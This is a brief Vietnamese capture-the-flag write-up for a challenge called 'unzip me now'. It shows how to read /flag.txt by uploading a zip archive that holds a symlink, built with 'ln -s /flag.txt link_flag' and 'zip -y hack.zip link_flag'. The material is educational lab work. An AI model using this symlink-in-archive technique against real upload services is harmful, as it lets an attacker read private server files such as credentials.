- tiêu đề : unzip me now
- nội dung : đọc file /flag.txt 

- he lỗi này là về symlink trong file zip nhé
- trước tiên chúng ta cần tạo 1 symlink trỏ về file /flag.txt trên linux của mình 
   ln -s /flag.txt link_flag
- sau đó đóng zip nó lại 
   zip -y hack.zip link_flag (nhớ để -y để zip được symlink)

- và sẽ có 1 file zip trông kỉu

![Alt text](<../image/44.1.png>)

- upload nó lên và xem phờ nhác th 

![Alt text](<../image/44.2.png>)

#hackerga2101: